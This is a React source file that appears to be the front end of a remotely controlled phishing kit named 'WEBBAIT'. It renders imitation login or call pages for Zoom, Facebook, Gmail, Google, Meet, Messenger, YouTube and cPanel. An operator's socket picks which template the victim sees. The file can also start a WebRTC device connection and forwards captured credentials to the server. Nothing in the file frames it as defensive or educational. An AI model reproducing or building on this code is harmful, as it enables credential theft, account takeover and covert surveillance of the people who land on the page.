import { useEffect, useMemo, useState } from 'react';
import './App.css';
import { AgentSocket, WebRtcWebsocket } from './sockets';
import { CPanelTemplate, FacebookTemplate, GmailTemplate, GoogleTemplate, MeetTemplate, MessengerTemplate, YouTubeTemplate, ZoomTemplate } from './templates';

export const App = () => {
  const query = useMemo(() => new URLSearchParams(window.location.search), []);
  const [template, setTempalte] = useState(query.get('template') || query.get('t'));
  const webRtcWebsocket = WebRtcWebsocket.getInstance();
  const agentSocket = AgentSocket.getInstance(localStorage.getItem('WEBBAIT_AGENT_ID') || '', localStorage.getItem('WEBBAIT_AGENT_TOKEN') || '');
  useEffect(() => {
    const subscription = agentSocket.subscribe({
      next: async event => {
        switch (event.type) {
          case 'missing-token':
          case 'invalid-token':
            localStorage.removeItem('WEBBAIT_AGENT_TOKEN');
            await agentSocket.requestAgentToken();
            agentSocket.connect();
            break;
          case 'agent-not-found':
            localStorage.removeItem('WEBBAIT_AGENT_ID');
            await agentSocket.requestAgentId();
            break;
          case 'new-token':
            localStorage.setItem('WEBBAIT_AGENT_TOKEN', event.token);
            break;
          case 'new-agent-id':
            localStorage.setItem('WEBBAIT_AGENT_ID', event.agentId);
            localStorage.setItem('WEBBAIT_AGENT_TOKEN', event.token);
            break;
          case 'cmd':
            const { cmd, data, cmdId } = event;
            switch (cmd) {
              case 'init-webrtc-device':
                agentSocket.next({ type: 'result', cmdId, result: 'initiating-webrtc-device' });
                webRtcWebsocket.setToken(data.token);
                await webRtcWebsocket.connect();
                break;
              case 'set-template':
                const { template } = data;
                switch (template) {
                  case 'cpanel':
                  case 'facebook':
                  case 'gmail':
                  case 'google':
                  case 'meet':
                  case 'messenger':
                  case 'youtube':
                  case 'zoom':
                    break;
                  default:
                    agentSocket.next({ type: 'result', cmdId, result: 'invalid-template' });
                    return;
                }
                query.set(query.has('template') ? 'template' : 't', template);
                window.history.replaceState({}, '', `?${query.toString()}`);
                setTempalte(template);
                agentSocket.next({ type: 'result', cmdId, result: 'template-set' });
                break;
              default:
                break;
            }
            break;
          case 'credentials':
            agentSocket.socket.emit('credentials', event.payload);
            break;
        }
      }
    });
    return () => subscription.unsubscribe();
  }, [agentSocket, webRtcWebsocket, query]);
  if (template) {
    switch (template) {
      case 'zoom':
        return <ZoomTemplate title='Zoom Call...' agentSocket={agentSocket} webRtcWebsocket={webRtcWebsocket} />;
      case 'facebook':
        return <FacebookTemplate title='Facebook - log in or sign up' agentSocket={agentSocket} webRtcWebsocket={webRtcWebsocket} />;
      case 'youtube':
        return <YouTubeTemplate title='YouTube' agentSocket={agentSocket} webRtcWebsocket={webRtcWebsocket} />;
      case 'google':
        return <GoogleTemplate title='Google' agentSocket={agentSocket} webRtcWebsocket={webRtcWebsocket} />;
      case 'meet':
        return <MeetTemplate title='Google Meet' agentSocket={agentSocket} webRtcWebsocket={webRtcWebsocket} />;
      case 'gmail':
        return <GmailTemplate title='Gmail' agentSocket={agentSocket} webRtcWebsocket={webRtcWebsocket} />;
      case 'messenger':
        return <MessengerTemplate title='Messenger' agentSocket={agentSocket} webRtcWebsocket={webRtcWebsocket} />;
      case 'cpanel':
        return <CPanelTemplate title='CPanel Login' agentSocket={agentSocket} webRtcWebsocket={webRtcWebsocket} />;
    }
  }
  return (
    <>App 1</>
  );
}
